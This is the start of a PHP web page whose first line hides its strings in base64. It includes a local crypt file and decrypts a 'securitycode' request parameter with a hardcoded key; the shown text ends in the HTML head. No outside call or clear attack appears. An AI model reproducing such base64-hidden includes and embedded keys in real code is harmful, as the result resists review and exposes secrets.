<?php include(base64_decode('Li4vaW5jL2NyeXB0LnBocA=='));if(!isset($_GET[base64_decode('c2VjdXJpdHljb2Rl')])){$szc0='';}else{$szc0=oue1($_GET[base64_decode('c2VjdXJpdHljb2Rl')],base64_decode('TWFuYW9zdXZpdGExMA=='));}?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
